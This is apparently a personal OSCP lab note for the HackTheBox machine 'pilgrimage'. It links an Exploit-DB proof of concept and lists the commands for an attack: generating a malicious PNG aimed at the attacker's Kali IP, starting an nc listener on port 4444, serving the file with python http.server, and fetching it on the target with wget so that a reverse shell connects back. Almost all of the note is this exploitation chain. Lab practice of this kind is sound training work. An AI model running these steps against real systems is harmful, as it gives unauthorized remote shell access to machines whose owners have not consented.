https://www.exploit-db.com/exploits/51249

Download this POC

Find a valid PNG to use (random png, but some will break)
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `python3 cve.py dwn.png ${KaliIP} 4444`;

dv.paragraph("```bash\n" + command + "\n```");
```
Start listener

```
nc -lvnp 4444
```

start python webserver

```
python3 -m http.server
```

---

ON TARGET

```
cd /var/www/pilgrimage.htb/shrunk
```

grab the hosted file off python server from kali attacker
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget ${KaliIP}:8000/binwalk_exploit.png`;

dv.paragraph("```bash\n" + command + "\n```");
```
Netcat should catch a connection.